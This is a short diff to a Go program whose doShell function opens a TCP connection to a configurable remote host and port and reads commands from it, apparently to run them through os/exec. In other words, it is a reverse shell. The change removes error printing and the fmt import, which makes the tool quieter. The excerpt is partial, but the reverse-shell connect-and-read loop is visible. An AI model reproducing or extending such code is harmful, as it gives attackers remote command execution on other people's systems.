@@ -2,7 +2,6 @@ package main
 
 import (
 	"bufio"
-	"fmt"
 	"net"
 	"os"
 	"os/exec"
@@ -20,8 +19,6 @@ var (
 func doShell() {
 	conn, err := net.Dial("tcp", Rshost+":"+Rsport)
 	if err != nil {
-		fmt.Println(err)
-
 		return
 	}
 
@@ -29,8 +26,6 @@ func doShell() {
 	for {
 		userCmd, err := reader.ReadString('\n')
 		if err != nil {
-			fmt.Println(err)
-
 			return
 		}
 		if strings.TrimRight(userCmd, "\n") == "exit" {
